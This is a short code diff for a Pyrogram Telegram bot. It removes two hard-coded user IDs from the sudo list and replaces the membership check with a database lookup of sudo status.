@@ -5,13 +5,16 @@ from pyrogram.types import Message
 
 from lib.config import SUDO_USERS
 from lib.helpers.database.blacklist import is_bl
-
-SUDO_USERS.extend([1317936398, 1095222353])
+from lib.helpers.database.sudo_sql import is_sudo
 
 
 def sudo_users(func: Callable) -> Callable:
     async def decorator(client, message):
-        if message.from_user.id in SUDO_USERS:
+        user = message.from_user.id
+        check = is_sudo(int(user))
+        if not check:
+            return False
+        else:
             return await func(client, message)
 
     return decorator
